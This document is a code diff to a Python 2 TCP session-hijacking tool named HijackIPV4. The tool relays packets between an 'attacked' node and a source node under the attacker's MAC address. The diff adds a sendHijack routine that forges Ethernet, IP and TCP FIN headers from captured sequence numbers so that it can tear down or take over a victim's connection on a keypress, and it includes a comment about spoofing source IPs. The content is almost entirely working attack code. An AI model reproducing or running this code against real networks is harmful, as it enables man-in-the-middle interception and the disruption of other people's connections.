@@ -28,6 +28,8 @@ def debug_print(string):
 
 class HijackIPV4:
     g_last_tcp_header = []
+    #g_last_ip_header_dst = ''
+    iph = ''
     src_mac = ''
     dst_mac = ''
     source_port = '' 
@@ -51,6 +53,12 @@ class HijackIPV4:
             print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
             sys.exit()
  
+    def sendHijack(self):
+        print 'closing connection'
+        p = self.generate_eth_header_hijack(Attacking_node.mac,Atacked_node.mac) \
+        + self.last_packet[14:34] + self.generate_hijact_tcp_header()
+        self.s.send(p)
+
     def receive(self):
         self.packetFull = self.s.recvfrom(c_AllPorts)
 
@@ -60,20 +68,44 @@ class HijackIPV4:
         self.translateIP()
         self.translateTCP()
         
+    def generate_hijack_ip_header(self):
+        source_ip = Attacking_node.ip
+        dest_ip = Atacked_node.ip # or socket.gethostbyname('www.google.com')
+        # ip header fields
+        ip_ihl = 5
+        ip_ver = 4
+        ip_tos = 0
+        ip_tot_len = 0  # kernel will fill the correct total length
+        ip_id = 54321   #Id of this packet
+        ip_frag_off = 0
+        ip_ttl = 255
+        ip_proto = socket.IPPROTO_TCP
+        ip_check = 0    # kernel will fill the correct checksum
+        ip_saddr = socket.inet_aton ( source_ip )   #Spoof the source ip address if you want to
+        ip_daddr = socket.inet_aton ( dest_ip )
+         
+        ip_ihl_ver = (ip_ver << 4) + ip_ihl
+         
+        # the ! in the pack format string means network order
+        ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
+        
+        return ip_header
+
+    def generate_eth_header_hijack(self,src_mac,dst_mac):
+        return pack('!6s6sH', binascii.unhexlify(dst_mac),  binascii.unhexlify(src_mac), self.eth_last[2])
 
     def generate_eth_header(self,src_mac,dst_mac):
         return pack('!6s6sH', binascii.unhexlify(dst_mac),  binascii.unhexlify(src_mac), self.eth[2])
 
     def generate_hijact_tcp_header(self):
 
-
         # tcp header fields
         tcp_source = self.g_last_tcp_header[0]   # source port
         tcp_dest = self.g_last_tcp_header[1]   # destination port
         tcp_seq = self.g_last_tcp_header[2] + 1
-        print tcp_seq
-        tcp_ack_seq = self.g_last_tcp_header[3] 
-        tcp_doff = self.g_last_tcp_header[4]    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
+        tcp_ack_seq = self.g_last_tcp_header[3]
+        print tcp_ack_seq 
+        tcp_doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
         #tcp flags
         tcp_fin = 1
         tcp_syn = 0
@@ -88,7 +120,11 @@ class HijackIPV4:
         tcp_offset_res = (tcp_doff << 4) + 0
         tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)
          
+        #print tcp_source
+        #print tcp_dest
+        #print "source=%s\ndest=%s\nseq=%s\n"%(sys.getsizeof(tcp_source),sys.getsizeof(tcp_dest),sys.getsizeof(tcp_seq))
         # the ! in the pack format string means network order
+        #tcp_header = pack('!HHLLB', tcp_source,tcp_dest,tcp_seq,tcp_ack_seq, tcp_offset_res)
         tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)
         return tcp_header
 
@@ -105,12 +141,12 @@ class HijackIPV4:
 
 
     def translateEthernet(self):
-        ethernet_header = self.packet[0:14]
-        self.eth = unpack('!6s6sH' , ethernet_header)
+        self.ethernet_header = self.packet[0:14]
+        self.eth = unpack('!6s6sH' , self.ethernet_header)
          
         
-        self.dst_mac = toHex(ethernet_header[0:6].decode("latin1"))
-        self.src_mac = toHex(ethernet_header[6:12].decode("latin1"))
+        self.dst_mac = toHex(self.ethernet_header[0:6].decode("latin1"))
+        self.src_mac = toHex(self.ethernet_header[6:12].decode("latin1"))
 
         #print stringToHex(self.src_mac)
         #print self.dst_mac
@@ -127,10 +163,10 @@ class HijackIPV4:
         ## TRANSLATE RECEIVED IP ###
         #take first 20 characters for the ip header
         ip_header = self.packet[14:34]
+        self.iph = self.packet[14:34]
 
         #now unpack them :)
         iph = unpack('!BBHHHBBH4s4s' , ip_header)
-
         version_ihl = iph[0]
         version = version_ihl >> 4
         ihl = version_ihl & 0xF
@@ -148,11 +184,30 @@ class HijackIPV4:
         debug_print(string_print) 
 
     def translateTCP(self):
+        #header_dst_src = self.packet[34:38]
 
+        #header_ports = unpack('!HH',header_dst_src)
+
+        #print header_ports
+        
+        #print "iph length %s" %self.iph_length
+        #if (self.iph_length == 0):
+        #    tcp_header = self.packet[self.iph_length:self.iph_length+20]
+        #else:
+        #tcp_header = self.packet[0:20]
+        #if len(tcp_header) < 20:
+        #    print 'menorq'
         tcp_header = self.packet[self.iph_length:self.iph_length+20]
+        #else:
+        #    tcp_header = self.packet[(len(self.ethernet_header) + len(self.iph)):54]
 
+        # elif (self.iph_length == 20):
+        #     tcp_header = self.packet[34:54]
+        #     debug_header = self.packet[self.iph_length:self.iph_length+12]
+        #     bla = unpack('!HHLL', debug_header)
+        #     print "debug 1##\nack number: %s \nseq number =%s\n" %( bla[3],bla[2])
         #now unpack them :)
-        tcph = unpack('!HHLLBBHHH' , tcp_header)
+        tcph = unpack('!HHIIBBHHH' , tcp_header)
 
         self.source_port = tcph[0]
         self.dest_port = tcph[1]
@@ -172,12 +227,16 @@ class HijackIPV4:
         if self.d_addr == Atacked_node.ip:
             debug_print('Resending to atacked node')
             if(len(tcph) > 0):
+                self.last_packet = self.packet
+                print self.source_port
                 self.g_last_tcp_header = tcph
+                self.g_last_ip_header_dst = self.iph
+                self.eth_last = self.eth
             self.sendto(Attacking_node.mac, Atacked_node.mac)
         elif self.d_addr == Src_node.ip:
             debug_print('Resending to src node')
-            if(len(tcph) > 0):
-                self.g_last_tcp_header = tcph
+#            if(len(tcph) > 0):
+#                self.g_last_tcp_header = tcph
             self.sendto(Attacking_node.mac,Src_node.mac)
 
 #open config
@@ -197,6 +256,7 @@ hijack = HijackIPV4()
 while True:
     c = GetChar(False)
     if c == 'h':
-        hijack.hijack_flag = True
+        hijack.sendHijack()
+        #hijack.hijack_flag = True
     hijack.receive()
 
